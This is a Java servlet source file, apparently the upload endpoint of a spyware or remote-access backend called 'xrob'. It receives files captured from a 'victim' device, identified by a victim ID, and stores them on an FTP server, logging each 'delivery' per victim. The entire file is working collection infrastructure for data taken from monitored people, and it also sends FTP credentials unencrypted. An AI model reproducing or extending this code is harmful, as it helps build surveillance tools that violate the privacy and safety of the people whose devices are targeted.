package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.Deliveries;
import com.theah64.xrob.api.database.tables.Servers;
import com.theah64.xrob.api.database.tables.Media;
import com.theah64.xrob.api.models.Delivery;
import com.theah64.xrob.api.models.Server;
import com.theah64.xrob.api.utils.APIResponse;
import com.theah64.xrob.api.utils.FilePart;
import org.apache.commons.net.ftp.FTPClient;

import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;
import java.io.IOException;

/**
 * Created by theapache64 on 11/18/2015,12:10 AM.
 */

@WebServlet(urlPatterns = {AdvancedBaseServlet.VERSION_CODE + "/upload"})
@MultipartConfig
public class UploadServlet extends AdvancedBaseServlet {


    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        setGETMethodNotSupported(resp);
    }


    @Override
    protected boolean isSecureServlet() {
        return true;
    }

    @Override
    protected String[] getRequiredParameters() {
        return new String[]{KEY_ERROR, // To track if the delivery has any error
                KEY_DATA_TYPE, //Data type of the file
                Media.COLUMN_CAPTURED_AT,
                KEY_MESSAGE //To explain about the success or error
        };
    }

    @Override
    protected void doAdvancedPost() throws Exception {

        final String victimId = getHeaderSecurity().getVictimId();

        final boolean hasError = getBooleanParameter(KEY_ERROR);
        final String message = getStringParameter(KEY_MESSAGE);
        final String dataType = getStringParameter(KEY_DATA_TYPE);

        //Has all needed params, so add it to deliveries
        final Delivery newDelivery;

        final Deliveries deliveries = Deliveries.getInstance();

        //TODO: Algorithm modification: fileSize > 50MB ? useFTP : normal;

        if (!hasError) {

            //Yes,it's a valid data type
            final Part dataFilePart = getHttpServletRequest().getPart(KEY_DATA);

            if (dataFilePart != null) {

                final FilePart filePart = new FilePart(dataFilePart);
                final String fileName = filePart.getRandomFileName();

                final Server ftpServer = Servers.getInstance().getLeastUsedServer();
                final FTPClient ftpClient = new FTPClient();

                ftpClient.connect(ftpServer.getFtpDomain());
                ftpClient.login(ftpServer.getFtpUsername(), ftpServer.getFtpPassword());

                System.out.println("File uploading...");

                ftpClient.storeFile(ftpServer.getFolderToSave() + "/" + fileName, dataFilePart.getInputStream());

                final String downloadLink = String.format("http://%s%s", ftpServer.getFtpDomain(), fileName);

                System.out.println("File uploaded");

                ftpClient.logout();

                //Success message
                getWriter().write(new APIResponse("File uploaded", Media.COLUMN_DOWNLOAD_LINK, downloadLink).getResponse());

                //What ever the data_type, adding delivery;
                deliveries.addv2(new Delivery(victimId, false, message, dataType, -1));


            } else {
                final String errorMessage = KEY_DATA + " is missing";

                deliveries.addv2(new Delivery(victimId, true, "ERROR: " + errorMessage + " , MESSAGE: " + message, dataType, -1));

                //ERROR: No file found
                throw new Exception(errorMessage);
            }

        } else {
            //Has error
            getWriter().write(
                    new APIResponse("Error report added", null).getResponse()
            );
        }

    }

}
